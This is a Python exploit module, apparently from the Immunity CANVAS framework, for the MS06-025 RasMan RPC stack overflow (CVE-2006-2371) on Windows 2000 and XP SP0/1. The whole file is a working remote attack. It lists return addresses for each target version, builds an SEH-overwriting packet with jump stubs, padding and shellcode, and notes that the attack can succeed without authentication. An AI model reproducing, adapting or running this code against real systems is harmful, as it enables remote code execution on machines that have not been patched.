#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct
if "." not in sys.path: sys.path.append(".")
from exploitutils import *
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef as mosdef
import canvasengine

# GUI info
NAME= "RasMan RPC Server Stack Overflow"
DESCRIPTION= "RasMan RPC Server Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "06/13/2006"
DOCUMENTATION["References"]="http://www.microsoft.com/technet/security/Bulletin/MS06-025.mspx"
DOCUMENTATION["Platforms Tested"] = "Windows 2000 / Windows XP SP0/1"
DOCUMENTATION["MS"]="MS06-025"
DOCUMENTATION["CVE Name"] = "CVE-2006-2371"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2371"
DOCUMENTATION['CVSS'] = 7.5
VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]    #remote potential only on xpsp1 and below
PROPERTY['MSADV'] = "MS06-025"
GTK2_DIALOG="dialog.glade2"
CHANGELOG="""

"""
NOTES="""

    long Function_0c(
    [in,out] [size_is(element_77)] [unique] byte *element_76,
        [in] long element_77
    );


On Win2kSP4 does seem to work without authentication as long
as Remote Access Connection Manager, Remote Access Auto Connection Manager,
or Routing and Remote Access is started.
    
"""
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit


WIN2K = 1
XPSP1 = 2

#  Ret Address: jmp %ebx or a pop/pop/ret
#  
# info, align, index
targets = {
    0 : ["Autoversioning (N/A)", 0],
    1 : ["Windows 2000 SP4",  0x77345F32L], # 77345F32 : pop %esi/pop %edi/ret [IPHLPAPI.DLL] (svchost.exe (PID: 480))

    2 : ["Windows XP SP0 (all languages)",  0xFFE2115L], #  pop %esi/pop %ebx/ret [rsaenh.dll] 
    3 : ["Windows XP SP1 (English)",  0x77F789B3L], # 77F789B3 : pop %esi/pop %edi/ret [ntdll.dll] (svchost.exe (PID: 984))
    4 : ["Windows XP SP1 (All language)", 0x78052856L ] # 78052856 : pop %esi/pop %edi/ret [rpcrt4.dll] (svchost.exe (PID: 1020))

}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = "\x00"
        self.UUID           = u"20610036-fa22-11cf-9823-00a0c911e5df"
        self.uuidversion    = u"1.0"
        self.targetfunction = 0xc
        self.autoversion    = 1
        self.name           = NAME
    
    def buildConnectionList(self):
        self.connectionList= ["ncacn_np:%s[\\ROUTER]"% (self.host), "ncacn_np:%s[\\srvsvc]"% (self.host)]
        return self.connectionList
    
    def testOS(self):
        return 0 

        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        print "target=%s->%s"%(self.target,app.target)
        result=app.run()
        if result == 0:
            self.log("Unknown OS, automatic detection failed (try choosing a version)")
            return 0
        if app.result.find("2000") > -1:
            self.log("OS might be vulnerable (WIN2K): %s" % result)
            self.version= WIN2K
            return 1
        elif app.result.find("XP") > -1:
            self.log("OS might be vulnerable (SP0, SP1a): %s" % result)
            self.version = XPSP1
            return 1
        elif app.result.find("NT") > -1:
            #self.version = NT4
            self.log("OS vulnerable only locally: %s" % result)
            return 0
        else:
            self.log("OS not vulnerable: %s" % result)
        return 0
    
    def buildDcePacket(self):
        description, addy = targets[self.version]
        self.log("Attacking version: %s" % description) 
        # The index function is #72
        # and it need a number < than 0xb tu survive to the overflow

        data = struct.pack("<L", 0x3)
        data+= struct.pack("<L", 72)
        jmp = mosdef.assemble("jmp $0x6", "X86") + "TT"
        combination = jmp
        combination+= struct.pack("<L", addy)

        # Since there is a difference in the stack layout from win2000 and
        # Windows XP, we try both layout at the same time.
        # Also, sometimes from XP and XP changes a bit, but 
        # we brute force it. Keep in mind we are overwriting the SEH 
        # This is how it looks like
        #
        #    [ jump +0x6] [ ADDY ]
        #    [ jump +0x6] [ ADDY ]
        #    [ jump +0x6] [ ADDY ]
        #    [ jump +0x6] [ ADDY ]
        #    [ NOPS... ]
        #    [ Shellcode]
        #    [ jump +0x6] [ ADDY]
        #    [ jmp -$0x3f0]
        #    [ B... until we get a crash in memcpy ]
      
        data+= "AAAA"
        data+=combination * 0x20
        data+= "A" * (0x450 - len(self.shellcode) - (0x20*8)-4 )
        data+= self.shellcode
        data+= jmp 
        data+=struct.pack("<L", addy)
        data+= mosdef.assemble("jmp $-%d " % (len(self.shellcode)+0x10), "X86") + "TTT"
        #data+= mosdef.assemble("jmp $-0x3f0 ", "X86") + "TTT"
        data+= "B" * (0xa08-0x454-4 )

        buf = struct.pack("<L", 0x12ef4c)
        buf+= struct.pack("<L", len(data))
        buf+= data
        buf+= struct.pack("<L", len(data))

        return buf
    
    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
